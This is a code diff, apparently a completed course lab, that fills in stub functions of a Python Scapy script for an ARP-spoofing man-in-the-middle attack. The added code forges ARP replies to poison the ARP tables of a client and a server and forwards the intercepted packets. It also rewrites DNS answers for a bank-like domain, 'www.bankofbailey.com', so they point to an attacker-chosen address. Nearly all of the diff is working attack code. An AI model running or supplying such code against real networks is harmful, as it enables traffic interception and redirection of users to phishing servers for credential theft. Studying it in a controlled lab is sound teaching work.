@@ -26,7 +26,10 @@ def debug(s):
 
 # TODO: returns the mac address for an IP
 def mac(IP):
-
+    arpReq = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
+    resp = srp(arpReq)
+    print(f'# MAC for {IP}: {resp[0][0][1].hwsrc}')
+    return resp[0][0][1].hwsrc
 
 def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
     while True:
@@ -38,16 +41,46 @@ def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerM
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(src_ip, src_mac, dst_ip, dst_mac):
     debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
-
+    spoofReq = ARP(op=2 , pdst=dst_ip, psrc=src_ip, hwdst=dst_mac, hwsrc=src_mac)
+    send(spoofReq)
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
+    restoreReq = ARP(op=2, pdst=dstIP, psrc=srcIP, hwdst=dstMAC, hwsrc=srcMAC)
+    send(restoreReq)
+
+routingMap = {}
+
+def handlePacket(pkt):
+    global clientIP, serverIP, attackerMAC
+    # Forward packet to indended host
+    ip_src = pkt[IP].src
+    ip_dst = pkt[IP].dst
+    pkt[Ether].src = attackerMAC
+    pkt[Ether].dst = routingMap[ip_dst]
+    # print(f" Modified packet MAC : {pkt[Ether].dst}")
+    # Check if DNS packet
+    if pkt.haslayer(DNS):
+        dns = pkt.getlayer(DNS)
+        if dns.qr == 1:
+            if dns.an is not None and dns.an.rrname == b'www.bankofbailey.com.':
+                # Change response address
+                pkt[DNS].an.rdata = "10.4.63.200"
+                del pkt[IP].len
+                del pkt[IP].chksum
+                del pkt[UDP].len
+                del pkt[UDP].chksum
+                pkt = pkt.__class__(bytes(pkt))
+    sendp(pkt)
 
 
 # TODO: handle intercepted packets
 def interceptor(packet):
     global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
+    routingMap[clientIP] = clientMAC
+    routingMap[serverIP] = serverMAC
+    sniff(prn=handlePacket, filter=f"udp port 53 and ip host {clientIP}")
 
 
 if __name__ == "__main__":
